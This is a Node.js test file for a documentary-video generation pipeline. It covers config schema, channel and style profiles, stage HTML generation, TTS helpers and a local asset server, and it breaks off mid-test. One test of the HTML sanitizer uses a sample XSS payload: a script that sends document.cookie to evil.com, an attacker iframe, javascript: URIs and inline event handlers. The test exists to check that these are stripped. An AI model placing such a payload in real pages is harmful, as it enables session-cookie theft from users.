const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');

// Target contract modules
const {
  VALID_VISUAL_ENGINES,
  VALID_SUBTITLE_MODES,
  VALID_ASPECT_RATIOS,
  normalizePipelineConfig,
  validateChannelProfile,
  validateStyleProfile,
  parseCliArgsToConfig
} = require('../config/schema');

const {
  getChannelProfile,
  resolveChannelVariant,
  listChannels
} = require('../channels/channel-manager');

const {
  getTrendingIdeas,
  appendTrendingIdeas,
  markTopicUsed
} = require('../channels/channel-ideas');

const {
  getStyleProfile,
  compileStyleCssVariables,
  renderBrandBackgroundLayerHtml,
  listStyles
} = require('../styles/style-manager');

const {
  decideBeatEngine,
  sanitizeAndWrapVectorHtml,
  buildDeterministicVectorFallback
} = require('../engine/visual-engine');

const {
  generateStageHtml
} = require('../engine/stage-generator');

const {
  synthesizeWithApiVoice,
  synthesizeSpeech,
  extractWordBoundaries
} = require('../scripts/tts');

const {
  disposeVectorDb
} = require('../scripts/vector-db');

const {
  startStaticAssetServer
} = require('../scripts/render');

// ============================================================================
// 1. Schema & CLI Parsing (config/schema.js)
// ============================================================================

test('1. Schema & CLI: default resolution produces canonical defaults', () => {
  const defaults = normalizePipelineConfig();

  assert.ok(defaults.jobId && defaults.jobId.startsWith('job-'), 'jobId should default to job-<timestamp>');
  assert.strictEqual(defaults.topic, 'Untitled Documentary');
  assert.strictEqual(defaults.channelId, 'kausalmedia');
  assert.strictEqual(defaults.videoVariant, 'forensic-autopsy');
  assert.strictEqual(defaults.styleId, 'kausalmedia');
  assert.strictEqual(defaults.aspectRatio, '16:9');
  assert.strictEqual(defaults.visualEngine, 'hybrid');

  // Subtitles default
  assert.strictEqual(defaults.subtitles.enabled, true);
  assert.strictEqual(defaults.subtitles.mode, 'kinetic-pill');
  assert.strictEqual(defaults.subtitles.position, 'bottom');

  // Audio default
  assert.strictEqual(defaults.audio.source, 'edge-tts');
  assert.strictEqual(defaults.audio.voice, 'id-ID-ArdiNeural');
  assert.strictEqual(defaults.audio.rate, '+5%');
  assert.strictEqual(defaults.audio.duckingDb, -22);

  // Render optimization clamps defaults
  assert.strictEqual(defaults.render.fps, 24);
  assert.strictEqual(defaults.render.jpegQuality, 85);
  assert.strictEqual(defaults.render.ffmpegThreads, 2);
  assert.strictEqual(defaults.render.chromiumMaxHeapMb, 512);
});

test('1. Schema & CLI: channelProfile influences variant, style, and visualEngine defaults', () => {
  const nusantaraProfile = getChannelProfile('nusantaraarchive');
  const config = normalizePipelineConfig({}, nusantaraProfile);

  assert.strictEqual(config.channelId, 'nusantaraarchive');
  assert.strictEqual(config.videoVariant, 'chronicle-archive');
  assert.strictEqual(config.styleId, 'investigative-documentary');
  assert.strictEqual(config.visualEngine, 'hybrid');
  assert.strictEqual(config.audio.voice, 'id-ID-ArdiNeural');
});

test('1. Schema & CLI: parses --no-subtitles and subtitles: "off" accurately', () => {
  // CLI flags parsing
  const parsedNoSub = parseCliArgsToConfig(['--no-subtitles']);
  assert.strictEqual(parsedNoSub.subtitles, false);

  const parsedSubOff = parseCliArgsToConfig(['--subtitles', 'off']);
  assert.strictEqual(parsedSubOff.subtitles, false);

  const parsedSubNone = parseCliArgsToConfig(['--subtitles', 'none']);
  assert.strictEqual(parsedSubNone.subtitles, false);

  const parsedSubFalse = parseCliArgsToConfig(['--subtitles', 'false']);
  assert.strictEqual(parsedSubFalse.subtitles, false);

  // Normalization behavior
  const norm1 = normalizePipelineConfig({ subtitles: false });
  assert.deepStrictEqual(norm1.subtitles, { enabled: false, mode: 'off', position: 'bottom' });

  const norm2 = normalizePipelineConfig({ subtitles: 'off' });
  assert.deepStrictEqual(norm2.subtitles, { enabled: false, mode: 'off', position: 'bottom' });

  const norm3 = normalizePipelineConfig({ subtitles: { mode: 'off' } });
  assert.deepStrictEqual(norm3.subtitles, { enabled: false, mode: 'off', position: 'bottom' });

  const norm4 = normalizePipelineConfig({ subtitles: { enabled: false } });
  assert.deepStrictEqual(norm4.subtitles, { enabled: false, mode: 'off', position: 'bottom' });

  const norm5 = normalizePipelineConfig({ subtitles: { enabled: false, mode: 'kinetic-pill' } });
  assert.deepStrictEqual(norm5.subtitles, { enabled: false, mode: 'kinetic-pill', position: 'bottom' });

  // Enabled modes
  const parsedKaraoke = parseCliArgsToConfig(['--subtitles', 'karaoke-word']);
  assert.strictEqual(parsedKaraoke.subtitles, 'karaoke-word');

  const normKaraoke = normalizePipelineConfig({ subtitles: 'karaoke-word' });
  assert.deepStrictEqual(normKaraoke.subtitles, { enabled: true, mode: 'karaoke-word', position: 'bottom' });

  const normBroadcast = normalizePipelineConfig({ subtitles: 'broadcast-lower' });
  assert.deepStrictEqual(normBroadcast.subtitles, { enabled: true, mode: 'broadcast-lower', position: 'bottom' });
});

test('1. Schema & CLI: visualEngine validation (vector-html, ai-image, hybrid)', () => {
  assert.deepStrictEqual(VALID_VISUAL_ENGINES, ['vector-html', 'ai-image', 'hybrid']);

  assert.strictEqual(normalizePipelineConfig({ visualEngine: 'vector-html' }).visualEngine, 'vector-html');
  assert.strictEqual(normalizePipelineConfig({ visualEngine: 'ai-image' }).visualEngine, 'ai-image');
  assert.strictEqual(normalizePipelineConfig({ visualEngine: 'hybrid' }).visualEngine, 'hybrid');

  // Invalid fallback defaults to 'hybrid'
  assert.strictEqual(normalizePipelineConfig({ visualEngine: 'invalid-engine' }).visualEngine, 'hybrid');
  assert.strictEqual(normalizePipelineConfig({ visualEngine: '' }).visualEngine, 'hybrid');

  // CLI argument parsing
  const parsedEngineVec = parseCliArgsToConfig(['--visual-engine', 'vector-html']);
  assert.strictEqual(parsedEngineVec.visualEngine, 'vector-html');

  const parsedEngineAi = parseCliArgsToConfig(['--engine', 'ai-image']);
  assert.strictEqual(parsedEngineAi.visualEngine, 'ai-image');
});

test('1. Schema & CLI: enforces 4GB RAM hardware clamps (fps, ffmpegThreads, chromiumMaxHeapMb, jpegQuality)', () => {
  // fps clamped to [15, 60]
  assert.strictEqual(normalizePipelineConfig({ render: { fps: 5 } }).render.fps, 15);
  assert.strictEqual(normalizePipelineConfig({ render: { fps: 120 } }).render.fps, 60);
  assert.strictEqual(normalizePipelineConfig({ render: { fps: 30 } }).render.fps, 30);
  assert.strictEqual(normalizePipelineConfig({ fps: 10 }).render.fps, 15);

  // ffmpegThreads clamped to [1, 4]
  assert.strictEqual(normalizePipelineConfig({ render: { ffmpegThreads: 0 } }).render.ffmpegThreads, 1);
  assert.strictEqual(normalizePipelineConfig({ render: { ffmpegThreads: 8 } }).render.ffmpegThreads, 4);
  assert.strictEqual(normalizePipelineConfig({ render: { ffmpegThreads: 3 } }).render.ffmpegThreads, 3);
  assert.strictEqual(normalizePipelineConfig({ ffmpegThreads: 16 }).render.ffmpegThreads, 4);

  // chromiumMaxHeapMb clamped to [256, 768]
  assert.strictEqual(normalizePipelineConfig({ render: { chromiumMaxHeapMb: 100 } }).render.chromiumMaxHeapMb, 256);
  assert.strictEqual(normalizePipelineConfig({ render: { chromiumMaxHeapMb: 2048 } }).render.chromiumMaxHeapMb, 768);
  assert.strictEqual(normalizePipelineConfig({ render: { chromiumMaxHeapMb: 512 } }).render.chromiumMaxHeapMb, 512);
  assert.strictEqual(normalizePipelineConfig({ chromiumMaxHeapMb: 64 }).render.chromiumMaxHeapMb, 256);

  // jpegQuality clamped to [50, 95]
  assert.strictEqual(normalizePipelineConfig({ render: { jpegQuality: 20 } }).render.jpegQuality, 50);
  assert.strictEqual(normalizePipelineConfig({ render: { jpegQuality: 100 } }).render.jpegQuality, 95);
  assert.strictEqual(normalizePipelineConfig({ render: { jpegQuality: 75 } }).render.jpegQuality, 75);
});

test('1. Schema & CLI: validates ChannelProfile and StyleProfile objects', () => {
  const validChannel = getChannelProfile('kausalmedia');
  const chanRes = validateChannelProfile(validChannel);
  assert.strictEqual(chanRes.valid, true);
  assert.strictEqual(chanRes.errors.length, 0);

  const invalidChanRes = validateChannelProfile({ id: 'bad' });
  assert.strictEqual(invalidChanRes.valid, false);
  assert.ok(invalidChanRes.errors.length > 0);

  const validStyle = getStyleProfile('kausalmedia');
  const styleRes = validateStyleProfile(validStyle);
  assert.strictEqual(styleRes.valid, true);
  assert.strictEqual(styleRes.errors.length, 0);

  const invalidStyleRes = validateStyleProfile(null);
  assert.strictEqual(invalidStyleRes.valid, false);
});

// ============================================================================
// 2. Channel & Variant Resolution (channels/channel-manager.js & channel-ideas.js)
// ============================================================================

test('2. Channels: verifies kausalmedia (<8KB on disk) and nusantaraarchive (active: true)', () => {
  const kmPath = path.resolve(__dirname, '../channels/kausalmedia.json');
  const naPath = path.resolve(__dirname, '../channels/nusantaraarchive.json');

  assert.ok(fs.existsSync(kmPath), 'channels/kausalmedia.json must exist');
  assert.ok(fs.existsSync(naPath), 'channels/nusantaraarchive.json must exist');

  const kmStat = fs.statSync(kmPath);
  assert.ok(kmStat.size < 8192, `kausalmedia.json size (${kmStat.size} bytes) must be under 8KB`);

  const naStat = fs.statSync(naPath);
  assert.ok(naStat.size < 8192, `nusantaraarchive.json size (${naStat.size} bytes) must be under 8KB`);

  const kmProfile = getChannelProfile('kausalmedia');
  assert.strictEqual(kmProfile.id, 'kausalmedia');
  assert.strictEqual(kmProfile.active, true);
  assert.ok(kmProfile.editorialDna && Array.isArray(kmProfile.editorialDna.antiSlopRules));
  assert.ok(Object.keys(kmProfile.variants).length >= 4);

  const naProfile = getChannelProfile('nusantaraarchive');
  assert.strictEqual(naProfile.id, 'nusantaraarchive');
  assert.strictEqual(naProfile.active, true);
  assert.ok(naProfile.editorialDna && Array.isArray(naProfile.editorialDna.antiSlopRules));
  assert.ok(Object.keys(naProfile.variants).length >= 1);

  // Verifies listChannels reflects active status
  const activeChannels = listChannels({ activeOnly: true });
  const activeIds = activeChannels.map(c => c.id);
  assert.ok(activeIds.includes('kausalmedia'));
  assert.ok(activeIds.includes('nusantaraarchive'));
});

test('2. Channels: variant hook resolution and fallback behavior', () => {
  // Explicit variant resolution
  const autopsy = resolveChannelVariant('kausalmedia', 'forensic-autopsy');
  assert.strictEqual(autopsy.id, 'forensic-autopsy');
  assert.strictEqual(autopsy.aspectRatio, '16:9');
  assert.strictEqual(autopsy.hookArchetype, 'data-shock-stat');
  assert.ok(Array.isArray(autopsy.narrativeBeats));
  assert.ok(autopsy.hookInstruction.length > 0);

  const paradox = resolveChannelVariant('kausalmedia', 'policy-paradox');
  assert.strictEqual(paradox.id, 'policy-paradox');
  assert.strictEqual(paradox.hookArchetype, 'contrarian-mythbust');

  const kinetic = resolveChannelVariant('kausalmedia', 'kinetic-short');
  assert.strictEqual(kinetic.id, 'kinetic-short');
  assert.strictEqual(kinetic.aspectRatio, '9:16');
  assert.strictEqual(kinetic.defaultSubtitles, 'karaoke-word');

  // Fallback to default variant for unknown variant ID
  const unknownFallback = resolveChannelVariant('kausalmedia', 'nonexistent-variant-xyz');
  assert.strictEqual(unknownFallback.id, 'forensic-autopsy');

  // Fallback to default variant when variantId is omitted
  const defaultNusantara = resolveChannelVariant('nusantaraarchive');
  assert.strictEqual(defaultNusantara.id, 'chronicle-archive');
});

test('2. Channels: ring-buffered trending-ideas.json capping without mutating channels/*.json', () => {
  const kmPath = path.resolve(__dirname, '../channels/kausalmedia.json');
  const naPath = path.resolve(__dirname, '../channels/nusantaraarchive.json');
  const trendingPath = path.resolve(__dirname, '../config/trending-ideas.json');

  const kmContentBefore = fs.readFileSync(kmPath, 'utf8');
  const naContentBefore = fs.readFileSync(naPath, 'utf8');
  const trendingContentBefore = fs.existsSync(trendingPath) ? fs.readFileSync(trendingPath, 'utf8') : '{}';

  try {
    const testChannel = 'test_channel_ringbuffer';
    const batch1 = [
      { id: 'idea-1', title: 'Topik Satu: Krisis Minyak Goreng', angle: 'Sudut 1', variant: 'forensic-autopsy' },
      { id: 'idea-2', title: 'Topik Dua: Kartel Garam Impor', angle: 'Sudut 2', variant: 'forensic-autopsy' },
      { id: 'idea-3', title: 'Topik Tiga: Monopoli Pelabuhan', angle: 'Sudut 3', variant: 'forensic-autopsy' },
      { id: 'idea-4', title: 'Topik Empat: Pajak Karbon Ditunda', angle: 'Sudut 4', variant: 'forensic-autopsy' },
      { id: 'idea-5', title: 'Topik Lima: Subsidi Pupuk Gelap', angle: 'Sudut 5', variant: 'forensic-autopsy' },
      { id: 'idea-6', title: 'Topik Enam: Likuiditas BUMN', angle: 'Sudut 6', variant: 'forensic-autopsy' }
    ];

    // Cap at 4 items
    const capped = appendTrendingIdeas(testChannel, batch1, 4);
    assert.strictEqual(capped.length, 4, 'Should cap ideas at maxCap = 4');
    assert.strictEqual(capped[0].title, 'Topik Satu: Krisis Minyak Goreng', 'First item in batch should be at top');

    // Test deduplication: new ideas prepended, duplicate title retained only once
    const batch2 = [
      { id: 'idea-new', title: 'Topik Baru: Kuota Impor Daging', angle: 'Sudut Baru' },
      { id: 'idea-dup', title: 'topik satu: krisis minyak goreng', angle: 'Duplicate' }
    ];
    const deduplicated = appendTrendingIdeas(testChannel, batch2, 4);
    assert.strictEqual(deduplicated.length, 4, 'Should maintain max cap of 4 items');
    assert.strictEqual(deduplicated[0].title, 'Topik Baru: Kuota Impor Daging', 'Fresh new idea should be prepended to top');

    // Verify deduplication: "krisis minyak goreng" appears exactly once
    const matchingTitleCount = deduplicated.filter(i => (i.title || '').toLowerCase().includes('krisis minyak goreng')).length;
    assert.strictEqual(matchingTitleCount, 1, 'Duplicate topic must be deduplicated to a single entry');

    // Read back via getTrendingIdeas
    const loaded = getTrendingIdeas(testChannel);
    assert.strictEqual(loaded.length, 4);
    assert.strictEqual(loaded[0].title, 'Topik Baru: Kuota Impor Daging');

    // Strict invariant: channels/*.json MUST NOT be mutated
    const kmContentAfter = fs.readFileSync(kmPath, 'utf8');
    const naContentAfter = fs.readFileSync(naPath, 'utf8');
    assert.strictEqual(kmContentAfter, kmContentBefore, 'channels/kausalmedia.json must not be modified');
    assert.strictEqual(naContentAfter, naContentBefore, 'channels/nusantaraarchive.json must not be modified');
  } finally {
    // Restore original trending-ideas.json
    fs.writeFileSync(trendingPath, trendingContentBefore, 'utf8');
  }
});

// ============================================================================
// 3. Style Compilation (styles/style-manager.js)
// ============================================================================

test('3. Styles: verifies CSS variable compilation for canonical styles', () => {
  const kmStyle = getStyleProfile('kausalmedia');
  const kmCss = compileStyleCssVariables(kmStyle);

  assert.ok(kmCss.includes(':root {'), 'CSS output must declare :root selector');
  assert.ok(kmCss.includes('--bg-primary: #faf6ee;'));
  assert.ok(kmCss.includes('--brand-primary: #b8332a;'));
  assert.ok(kmCss.includes('--brand-accent: #c98a2c;'));
  assert.ok(kmCss.includes('--font-display: \'Playfair Display\''));
  assert.ok(kmCss.includes('--font-mono: \'JetBrains Mono\''));

  const docStyle = getStyleProfile('investigative-documentary');
  const docCss = compileStyleCssVariables(docStyle);
  assert.ok(docCss.includes('--bg-primary: #111315;'));
  assert.ok(docCss.includes('--text-primary: #ece6d8;'));
  assert.ok(docCss.includes('--brand-primary: #c93b2b;'));

  const techStyle = getStyleProfile('tech-deepdive');
  const techCss = compileStyleCssVariables(techStyle);
  assert.ok(techCss.includes('--bg-primary: #f4f7fb;'));
  assert.ok(techCss.includes('--brand-primary: #2563eb;'));
  assert.ok(techCss.includes('--brand-accent: #0891b2;'));
});

test('3. Styles: verifies Layer 0–2 deterministic brand chrome for kausalmedia, investigative-documentary, and tech-deepdive', () => {
  // 1. Kausal Media
  const kmProfile = getChannelProfile('kausalmedia');
  const kmStyle = getStyleProfile('kausalmedia');
  const kmHtml = renderBrandBackgroundLayerHtml(kmStyle, kmProfile, '16:9');

  assert.ok(kmHtml.includes('id="layer-0-bg"'), 'Must render Layer 0 background');
  assert.ok(kmHtml.includes('id="layer-1-watermark"'), 'Must render Layer 1 watermark');
  assert.ok(kmHtml.includes('id="layer-2-chrome"'), 'Must render Layer 2 header bar');
  assert.ok(kmHtml.includes('pat-papyrus-batik'), 'Kausal Media must use papyrus-batik SVG pattern');
  assert.ok(kmHtml.includes('KAUSAL MEDIA // FORENSIC DOSSIER'), 'Must render watermark text');
  assert.ok(kmHtml.includes('id="stage-chapter-title"'), 'Must include #stage-chapter-title container');

  // 2. Investigative Documentary
  const naProfile = getChannelProfile('nusantaraarchive');
  const docStyle = getStyleProfile('investigative-documentary');
  const docHtml = renderBrandBackgroundLayerHtml(docStyle, naProfile, '16:9');

  assert.ok(docHtml.includes('id="layer-0-bg"'));
  assert.ok(docHtml.includes('id="layer-1-watermark"'));
  assert.ok(docHtml.includes('id="layer-2-chrome"'));
  assert.ok(docHtml.includes('pat-archival-grain'), 'Investigative Documentary must use archival-grain SVG pattern');
  assert.ok(docHtml.includes('ARCHIVAL DOSSIER // DECLASSIFIED EVIDENCE'));

  // 3. Tech Deepdive
  const techStyle = getStyleProfile('tech-deepdive');
  const techHtml = renderBrandBackgroundLayerHtml(techStyle, kmProfile, '16:9');

  assert.ok(techHtml.includes('id="layer-0-bg"'));
  assert.ok(techHtml.includes('pat-blueprint-grid'), 'Tech Deepdive must use blueprint-grid SVG pattern');
  assert.ok(techHtml.includes('SYSTEM ARCHITECTURE // SPECIFICATION BLUEPRINT'));
});

// ============================================================================
// 4. Dual Visual Engine (engine/visual-engine.js)
// ============================================================================

test('4. Dual Visual Engine: verifies decideBeatEngine in vector-html, ai-image, and hybrid modes', () => {
  const genericScene = {
    narration: 'Ini adalah kalimat narasi biasa tanpa kata kunci data.',
    visualPrompt: 'Pemandangan lanskap Jakarta di waktu senja.'
  };

  const chartScene = {
    narration: 'Perhatikan perbandingan rasio utang sindikasi bank.',
    visualPrompt: 'Comparison bar chart showing leverage percentage over 5 years.'
  };

  const timelineScene = {
    narration: 'Kronologi audit investigatif transaksi gelap dari tahun 2018 hingga 2024.',
    visualPrompt: 'Vertical timeline schema of cash disbursements.'
  };

  // vector-html forced mode
  assert.strictEqual(decideBeatEngine(genericScene, { visualEngine: 'vector-html' }), 'vector-html');
  assert.strictEqual(decideBeatEngine(chartScene, { visualEngine: 'vector-html' }), 'vector-html');

  // ai-image forced mode
  assert.strictEqual(decideBeatEngine(genericScene, { visualEngine: 'ai-image' }), 'ai-image');
  assert.strictEqual(decideBeatEngine(chartScene, { visualEngine: 'ai-image' }), 'ai-image');

  // hybrid mode: keyword detection
  assert.strictEqual(decideBeatEngine(genericScene, { visualEngine: 'hybrid' }), 'ai-image');
  assert.strictEqual(decideBeatEngine(chartScene, { visualEngine: 'hybrid' }), 'vector-html');
  assert.strictEqual(decideBeatEngine(timelineScene, { visualEngine: 'hybrid' }), 'vector-html');
  assert.strictEqual(decideBeatEngine({ narration: 'Discrepancy on the balance sheet' }, { visualEngine: 'hybrid' }), 'vector-html');
  assert.strictEqual(decideBeatEngine({ visualPrompt: 'Capital flow diagram' }, { visualEngine: 'hybrid' }), 'vector-html');
  assert.strictEqual(decideBeatEngine({ visualPrompt: 'Taxonomy of corporate entities' }, { visualEngine: 'hybrid' }), 'vector-html');
});

test('4. Dual Visual Engine: verifies XSS and dangerous script stripping in sanitizeAndWrapVectorHtml', () => {
  const maliciousInput = `
    \`\`\`html
    <script>window.location="http://evil.com/cookie?c="+document.cookie;</script>
    <div class="good-card">
      <iframe src="https://attacker.com/frame"></iframe>
      <object data="exploit.swf"></object>
      <embed src="flash.swf">
      <h2 onclick="steal()" onload="inject()" onerror="boom()">Laporan Finansial</h2>
      <img src="https://tracker.evil.com/pixel.png" alt="tracker">
      <a href="javascript:alert(1)">Klik Saya</a>
    </div>
    \`\`\`
  `;

  const sceneBeat = { id: 'beat_xss_test' };
  const sanitized = sanitizeAndWrapVectorHtml(maliciousInput, sceneBeat);

  assert.strictEqual(sanitized.includes('<script'), false, 'All script tags must be stripped');
  assert.strictEqual(sanitized.includes('<iframe'), false, 'All iframe tags must be stripped');
  assert.strictEqual(sanitized.includes('<object'), false, 'All object tags must be stripped');
  assert.strictEqual(sanitized.includes('<embed'), false, 'All embed tags must be stripped');
  assert.strictEqual(sanitized.includes('onclick='), false, 'Inline event handlers must be stripped');
  assert.strictEqual(sanitized.includes('onload='), false, 'Inline event handlers must be stripped');
  assert.strictEqual(sanitized.includes('onerror='), false, 'Inline event handlers must be stripped');
  assert.strictEqual(sanitized.includes('https://tracker.evil.com'), false, 'External HTTP URLs must be stripped');
  assert.strictEqual(sanitized.includes('javascript:'), false, 'javascript: URIs must be stripped');
  assert.strictEqual(sanitized.includes('```'), false, 'Markdown code fences must be stripped');

  // Must wrap in sandboxed container
  assert.ok(sanitized.startsWith('<div class="ai-vector-sandbox" data-scene-id="beat_xss_test"'));
  assert.ok(sanitized.includes('width: 100%; height: 100%; overflow: hidden; position: relative;'));
  assert.ok(sanitized.includes('Laporan Finansial'));
});

test('4. Dual Visual Engine: verifies deterministic vector fallback generation', () => {
  const sceneBeat = {
    id: 'scene_01',
    chapterTitle: 'KERUGIAN NEGARA',
    narration: 'Kerugian negara akibat penggelapan cukai mencapai Rp 15 Triliun dengan margin -24.8%.',
    visualPrompt: 'Diagram alur distribusi rokok ilegal antar pulau'
  };

  const channel = getChannelProfile('kausalmedia');
  const style = getStyleProfile('kausalmedia');

  // 16:9 widescreen layout
  const html169 = buildDeterministicVectorFallback(sceneBeat, channel, style, '16:9');
  assert.ok(html169.includes('class="vec-card"'), 'Must include vec-card container');
  assert.ok(html169.includes('class="vec-stat-huge"'), 'Must include vec-stat-huge typography');
  assert.ok(html169.includes('Rp 15 Triliun'), 'Must render extracted hero currency metric');
  assert.ok(html169.includes('24.8%'), 'Must render extracted secondary percentage metric');
  assert.ok(html169.includes('var(--scene-progress'), 'Must bind animations to --scene-progress');
  assert.ok(html169.includes('<svg'), 'Must include SVG schematic paths');

  // 9:16 vertical layout
  const html916 = buildDeterministicVectorFallback(sceneBeat, channel, style, '9:16');
  assert.ok(html916.includes('class="vec-card"'));
  assert.ok(html916.includes('class="vec-stat-huge"'));
  assert.ok(html916.includes('viewBox="0 0 820 600"'));
});

// ============================================================================
// 5. 5-Layer Stage Generator (engine/stage-generator.js)
// ============================================================================

test('5. Stage Generator: verifies subtitles: "off" unmounts Layer 5 and expands Layer 3 to 92%', () => {
  const storyboard = {
    title: 'Off-Subtitles Test',
    scenes: [
      {
        id: 'scene_001',
        startTime: 0,
        endTime: 5,
        duration: 5,
        narration: 'Dokumenter tanpa subtitle teks di bagian bawah viewport.',
        visualPrompt: 'Archival courtroom documentary docket'
      }
    ]
  };

  const pipelineConfig = normalizePipelineConfig({
    channelId: 'kausalmedia',
    subtitles: 'off'
  });

  const stageHtml = generateStageHtml(storyboard, pipelineConfig);

  // Subtitles layer unmounted
  assert.strictEqual(stageHtml.includes('id="layer-5-subtitles"'), false, '#layer-5-subtitles must NOT be rendered');
  assert.strictEqual(stageHtml.includes('id="subtitle-box"'), false, '#subtitle-box must NOT be rendered');

  // Layer 3 expands to 92% height in its CSS rule
  const sandboxRuleMatch = stageHtml.match(/#layer-3-sandbox[^{]*\{[^}]*\}/);
  assert.ok(sandboxRuleMatch, '#layer-3-sandbox CSS rule must exist in stage.html');
  assert.ok(sandboxRuleMatch[0].includes('height: 92%'), 'Layer 3 must expand to height: 92% when subtitles are disabled');

  // Verify virtual clock is still present
  assert.ok(stageHtml.includes('window.__seekTo = function'), 'window.__seekTo API must be present');
});

test('5. Stage Generator: verifies subtitles: "karaoke-word" mounts Layer 5 and bounds Layer 3 to 80%', () => {
  const storyboard = {
    title: 'Karaoke Subtitles Test',
    scenes: [
      {
        id: 'scene_001',
        startTime: 0,
        endTime: 5,
        duration: 5,
        narration: 'Investigasi skandal perbankan nasional berlanjut ke sidang terbuka.',
        visualPrompt: 'Bank ledger balance exhibit'
      }
    ]
  };

  const pipelineConfig = normalizePipelineConfig({
    channelId: 'kausalmedia',
    subtitles: 'karaoke-word'
  });

  const stageHtml = generateStageHtml(storyboard, pipelineConfig);

  // Subtitles layer mounted
  assert.ok(stageHtml.includes('id="layer-5-subtitles"'), '#layer-5-subtitles must be mounted in DOM');
  assert.ok(stageHtml.includes('id="subtitle-box"'), '#subtitle-box container must be mounted');
  assert.ok(stageHtml.includes('karaoke-word'), 'Must set karaoke-word subtitle class');

  // Layer 3 safe area set to 80% in its CSS rule
  const sandboxRuleMatch = stageHtml.match(/#layer-3-sandbox[^{]*\{[^}]*\}/);
  assert.ok(sandboxRuleMatch, '#layer-3-sandbox CSS rule must exist in stage.html');
  assert.ok(sandboxRuleMatch[0].includes('height: 80%'), 'Layer 3 must be bounded to height: 80% when subtitles are enabled');

  // Virtual clock present
  assert.ok(stageHtml.includes('window.__seekTo = function'));
  assert.ok(stageHtml.includes('window.__updateSubtitles(timeMs);'));
});

test('5. Stage Generator: verifies zero data:image/ Base64 strings in stage.html', () => {
  const storyboard = {
    title: 'Zero Base64 Invariant Test',
    scenes: [
      {
        id: 'scene_001',
        startTime: 0,
        endTime: 4,
        assetUrl: '/assets/evidence-01.jpg',
        narration: 'Scene satu dengan gambar raster lokal.',
        visualPrompt: 'Bukti dokumen kontrak'
      },
      {
        id: 'scene_002',
        startTime: 4,
        endTime: 8,
        assetUrl: '/assets/evidence-02.png',
        narration: 'Scene dua dengan exhibit kedua.',
        visualPrompt: 'Bukti transfer sindikasi'
      }
    ]
  };

  const stageHtml = generateStageHtml(storyboard, { channelId: 'kausalmedia' });

  assert.strictEqual(stageHtml.includes('data:image/'), false, 'stage.html must NEVER contain data:image/ Base64 URIs');
  assert.strictEqual(stageHtml.includes('data:audio/'), false, 'stage.html must NEVER contain data:audio/ Base64 URIs');
  assert.ok(stageHtml.includes('/assets/evidence-01.jpg'), 'Assets must be referenced via relative URLs');
});

test('5. Stage Generator: verifies all 5 architectural layers and active-scene DOM mounting', () => {
  const storyboard = {
    scenes: [
      { id: 'sc_1', startTime: 0, endTime: 3, narration: 'Satu' },
      { id: 'sc_2', startTime: 3, endTime: 6, narration: 'Dua' }
    ]
  };

  const stageHtml = generateStageHtml(storyboard, { channelId: 'kausalmedia', subtitles: 'kinetic-pill' });

  assert.ok(stageHtml.includes('id="layer-0-bg"'), 'Layer 0 bg must exist');
  assert.ok(stageHtml.includes('id="layer-1-watermark"'), 'Layer 1 watermark must exist');
  assert.ok(stageHtml.includes('id="layer-2-chrome"'), 'Layer 2 chrome must exist');
  assert.ok(stageHtml.includes('id="layer-3-sandbox"'), 'Layer 3 sandbox must exist');
  assert.ok(stageHtml.includes('id="layer-4-vignette"'), 'Layer 4 vignette must exist');
  assert.ok(stageHtml.includes('id="layer-5-subtitles"'), 'Layer 5 subtitles must exist');

  // Active scene mounting virtual clock contract
  assert.ok(stageHtml.includes('window.__mountScene = function'), 'Must expose client-side __mountScene function');
  assert.ok(stageHtml.includes('window.__seekTo = function'), 'Must expose client-side __seekTo function');
  assert.ok(stageHtml.includes('window.__SCENES__'), 'Must inject window.__SCENES__ array');
  assert.ok(stageHtml.includes('window.__currentTimeMs'), 'Must expose window.__currentTimeMs');
});

// ============================================================================
// 6. TTS Exports & VectorDB Memory Disposal (scripts/tts.js & scripts/vector-db.js)
// ============================================================================

test('6. TTS Exports: synthesizeWithApiVoice, synthesizeSpeech, extractWordBoundaries are exported as functions', () => {
  assert.strictEqual(typeof synthesizeWithApiVoice, 'function', 'scripts/tts.js must export synthesizeWithApiVoice');
  assert.strictEqual(typeof synthesizeSpeech, 'function', 'scripts/tts.js must export synthesizeSpeech');
  assert.strictEqual(typeof extractWordBoundaries, 'function', 'scripts/tts.js must export extractWordBoundaries');

  // Test extractWordBoundaries utility
  const sampleCues = [
    { part: 'Investigasi', start: 0, end: 400 },
    { part: 'ekonomi', start: 400, end: 850 },
    { part: 'nasional', start: 850, end: 1300 }
  ];
  const boundaries = extractWordBoundaries(sampleCues, 1000);
  assert.strictEqual(boundaries.length, 3);
  assert.strictEqual(boundaries[0].word, 'Investigasi');
  assert.strictEqual(boundaries[0].start, 1.0);
  assert.strictEqual(boundaries[0].end, 1.4);
  assert.strictEqual(boundaries[1].word, 'ekonomi');
  assert.strictEqual(boundaries[1].start, 1.4);
  assert.strictEqual(boundaries[1].end, 1.85);
});

test('6. VectorDB Memory Disposal: disposeVectorDb() executes cleanly', async () => {
  assert.strictEqual(typeof disposeVectorDb, 'function', 'scripts/vector-db.js must export disposeVectorDb');

  // Calling disposeVectorDb() multiple times must resolve safely
  await assert.doesNotReject(async () => {
    await disposeVectorDb();
    await disposeVectorDb();
  }, 'disposeVectorDb() must execute cleanly without rejection');
});

// ============================================================================
// 7. Ephemeral Static Asset Server (scripts/render.js)
// ============================================================================

test('7. Static Asset Server: verifies HTTP serving of stage.html and /assets/* on 127.0.0.1', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arch-test-server-'));
  const stageFilePath = path.join(tmpDir, 'stage.html');
  const stageContent = '<!DOCTYPE html><html><body><h1 id="test-stage">Architecture Upgrade Verification Stage</h1></body></html>';
  fs.writeFileSync(stageFilePath, stageContent, 'utf8');

  const assetsSubDir = path.join(tmpDir, 'assets');
  fs.mkdirSync(assetsSubDir, { recursive: true });
  const sampleAssetPath = path.join(assetsSubDir, 'sample-metadata.json');
  const assetContent = JSON.stringify({ verified: true, engine: 'vector-html' });
  fs.writeFileSync(sampleAssetPath, assetContent, 'utf8');

  let serverInstance = null;

  try {
    serverInstance = await startStaticAssetServer(tmpDir);

    assert.ok(serverInstance, 'Static server instance must be returned');
    assert.ok(serverInstance.baseUrl.startsWith('http://127.0.0.1:'), `baseUrl (${serverInstance.baseUrl}) must bind to 127.0.0.1`);
    assert.strictEqual(typeof serverInstance.port, 'number');
    assert.ok(serverInstance.port > 0, 'Port must be a positive integer');

    // Helper for HTTP GET requests
    function fetchUrl(targetPath) {
